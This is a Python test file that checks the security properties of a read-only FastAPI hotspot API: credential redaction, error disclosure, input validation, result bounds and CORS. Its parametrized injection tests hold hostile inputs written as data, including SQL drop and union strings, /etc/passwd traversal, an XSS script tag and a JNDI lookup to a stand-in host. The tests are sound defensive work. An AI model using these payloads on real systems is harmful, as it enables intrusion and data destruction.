"""Security properties.

Focused on what this application actually exposes: a public read-only API over
third-party data. The realistic risks are credential leakage through error
paths, injection through query parameters, hostile field values arriving from
OpenStreetMap, and unbounded resource use.
"""

from __future__ import annotations

from datetime import datetime, timezone

import pytest
from conftest import insert_detection
from fastapi.testclient import TestClient

from app import main as api_main
from app import model as ml
from app.db import build_engine, ingest_runs, init_schema
from app.service import redact


@pytest.fixture
def client(tmp_path, monkeypatch):
    engine = build_engine(f"sqlite+pysqlite:///{tmp_path / 'sec.db'}")
    init_schema(engine)
    monkeypatch.setattr(ml, "load", lambda: None)
    with TestClient(api_main.app) as test_client:
        api_main.state.engine = engine
        api_main.state.model = None
        yield test_client, engine


# ------------------------------------------------------------- redaction --


def test_redacts_a_postgres_password():
    text = "connection failed: postgresql://heat:s3cr3tpw@ep-cool-1.aws.neon.tech/db"  # pragma: fake-credential
    cleaned = redact(text)
    assert "s3cr3tpw" not in cleaned
    assert "heat:" not in cleaned
    assert "***:***@" in cleaned
    # The host is retained: it is diagnostic and not a secret.
    assert "neon.tech" in cleaned


def test_redacts_a_key_shaped_hex_string():
    cleaned = redact("MAP_KEY rejected: 0123456789abcdef0123456789abcdef")
    assert "0123456789abcdef" not in cleaned
    assert "***" in cleaned


def test_redaction_truncates():
    assert len(redact("x" * 5000)) == 300


def test_redaction_passes_through_harmless_text():
    assert redact("HTTP 504 Gateway Timeout") == "HTTP 504 Gateway Timeout"


def test_redaction_handles_none():
    assert redact(None) is None


def test_runs_endpoint_redacts_stored_credentials(client):
    """The DB keeps the full error for operators; the public API must not."""
    test_client, engine = client
    now = datetime.now(timezone.utc)
    with engine.begin() as conn:
        conn.execute(
            ingest_runs.insert().values(
                source="features",
                started_at=now,
                finished_at=now,
                status="failed",
                rows_seen=0,
                rows_accepted=0,
                rows_rejected=0,
                rows_inserted=0,
                error="could not connect: postgresql://admin:hunter2@db.internal/heat",  # pragma: fake-credential
            )
        )

    body = test_client.get("/api/runs").json()
    assert "hunter2" not in body[0]["error"]
    assert "***" in body[0]["error"]


# ------------------------------------------------------- error disclosure --


def test_unhandled_errors_do_not_leak_internals(client, monkeypatch):
    """A 500 must return a request id, not a stack trace or schema details."""
    test_client, _ = client

    def explode(*_args, **_kwargs):
        raise RuntimeError("secret internal detail: /srv/app/config password=hunter2")

    monkeypatch.setattr(api_main.service, "get_analytics", explode)

    response = test_client.get("/api/analytics")
    assert response.status_code == 500

    body = response.json()
    assert "hunter2" not in response.text
    assert "RuntimeError" not in response.text
    assert "/srv/app" not in response.text
    assert body["request_id"]


# ------------------------------------------------------------ injection --


@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE detections; --",
        "' UNION SELECT 1,2,3 --",
        "1; DELETE FROM detections",
        "../../etc/passwd",
        "..%2f..%2fetc%2fpasswd",
        "<script>alert(1)</script>",
        "${jndi:ldap://evil.invalid/a}",
    ],
)
def test_hostile_detection_ids_are_rejected_safely(client, payload):
    test_client, engine = client
    insert_detection(engine)

    response = test_client.get(f"/api/hotspots/{payload}")
    assert response.status_code in (404, 422)

    # And the data is still there, i.e. nothing was executed.
    assert test_client.get("/api/hotspots").json()["count"] == 1


def test_hostile_filter_values_are_rejected(client):
    test_client, _ = client
    for params in (
        {"label": "'; DROP TABLE detections; --"},
        {"confidence_tier": "high' OR '1'='1"},
        {"min_frp_mw": "NaN"},
        {"within_hours": "1; SELECT 1"},
    ):
        assert test_client.get("/api/hotspots", params=params).status_code == 422


# ----------------------------------------------------- resource bounding --


def test_result_size_is_bounded(client):
    """An unbounded limit is a trivial memory-exhaustion vector on a public API."""
    test_client, _ = client
    assert test_client.get("/api/hotspots", params={"limit": 5001}).status_code == 422
    assert test_client.get("/api/hotspots", params={"limit": 5000}).status_code == 200


def test_offset_must_not_be_negative(client):
    test_client, _ = client
    assert test_client.get("/api/hotspots", params={"offset": -1}).status_code == 422


def test_within_hours_is_bounded(client):
    """Prevents a query that scans an arbitrarily large time range."""
    test_client, _ = client
    assert (
        test_client.get("/api/hotspots", params={"within_hours": 10**9}).status_code
        == 422
    )


# ------------------------------------------------------------ interface --


def test_api_is_read_only(client):
    """No write endpoint exists. Any future one needs authentication first."""
    test_client, _ = client
    for method in ("post", "put", "patch", "delete"):
        response = getattr(test_client, method)("/api/hotspots")
        assert response.status_code in (404, 405)


def test_cors_allows_only_get():
    from app.main import app  # noqa: PLC0415

    cors = next(
        m for m in app.user_middleware if "CORSMiddleware" in str(m.cls)
    )
    assert set(cors.kwargs["allow_methods"]) == {"GET"}
    assert cors.kwargs["allow_credentials"] is False


def test_no_wildcard_cors_origin():
    from app.config import settings  # noqa: PLC0415

    assert "*" not in settings.cors_origin_list
